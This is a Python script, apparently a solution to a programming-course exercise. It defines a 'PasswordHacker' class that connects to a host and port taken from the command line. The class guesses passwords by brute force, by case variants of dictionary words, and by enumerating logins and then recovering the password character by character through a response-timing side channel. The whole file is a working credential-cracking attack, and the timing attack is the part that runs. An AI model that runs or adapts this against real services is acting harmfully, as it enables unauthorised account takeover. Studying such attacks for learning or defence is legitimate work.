import sys
import socket
import itertools
import string
import os
import json
from datetime import datetime, timedelta


class PasswordHacker:

    def __init__(self):
        self.get_params()

    def get_params(self):
        self.ip_address = sys.argv[1]
        self.port = int(sys.argv[2])
        # self.message = sys.argv[3]

    def make_request(self):
        with socket.socket() as hack_socket:
            hack_socket.connect((self.ip_address, self.port))
            hack_socket.send(self.message.encode())
            self.response_raw = hack_socket.recv(1024)
            self.response = self.response_raw.decode()

    def find_password(self, pass_generator):
        with socket.socket() as hack_socket:
            hack_socket.connect((self.ip_address, self.port))
            for message in pass_generator():
                hack_socket.send(message.encode())
                response_raw = hack_socket.recv(1024)
                response = response_raw.decode()
                if response == 'Connection success!':
                    self.password = message
                    print(self.password)
                    return self.password

    def show_response(self):
        print(self.response)

    @classmethod
    def pass_brute(cls):
        n = 1
        letter_number = string.ascii_lowercase + string.digits
        while True:
            for i in itertools.product(letter_number, repeat=n):
                yield ''.join(i)
            n += 1

    @classmethod
    def pass_smart(cls):
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "passwords.txt"), 'tr') as file_pass:
            for word in file_pass.readlines():
                for i in itertools.product([0, 1], repeat=len(word[:-1])):
                    res = [letter.upper() if n == 1 else letter.lower() for (n, letter) in zip(i, word[:-1])]
                    yield ''.join(res)

    def find_login_pass(self):
        with socket.socket() as hack_socket:
            hack_socket.connect((self.ip_address, self.port))
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "logins.txt"), 'tr') as file_login:
                for word in file_login.readlines():
                    try_login = {'login': word[:-1], 'password': ' '}
                    mess_json = json.dumps(try_login)
                    hack_socket.send(mess_json.encode())
                    response_raw = hack_socket.recv(1024)
                    response = response_raw.decode()
                    response_json = json.loads(response)
                    if response_json['result'] == 'Wrong password!':
                        login = try_login['login']
                        break
                else:
                    login = None
                    print('We did not find proper candidate for login')
                    exit()
                pass_candidate = ''
                letter_number = string.ascii_lowercase + string.ascii_uppercase + string.digits
                while True:
                    for i in letter_number:
                        pass_candidate += i
                        try_login = {'login': login, 'password': pass_candidate}
                        mess_json = json.dumps(try_login)
                        start = datetime.now()
                        hack_socket.send(mess_json.encode())
                        response_raw = hack_socket.recv(1024)
                        finish = datetime.now()
                        difference = finish - start
                        response = response_raw.decode()
                        response_json = json.loads(response)
                        if response_json['result'] == 'Connection success!':
                            print(json.dumps(try_login))
                            exit()
                        elif difference >= timedelta(seconds=0.1):
                            # print(pass_candidate)
                            break
                        else:
                            pass_candidate = pass_candidate[:-1]


hack = PasswordHacker()
# hack.find_password(PasswordHacker.pass_brute())
# hack.show_response()
# hack.find_password((PasswordHacker.pass_smart))
hack.find_login_pass()
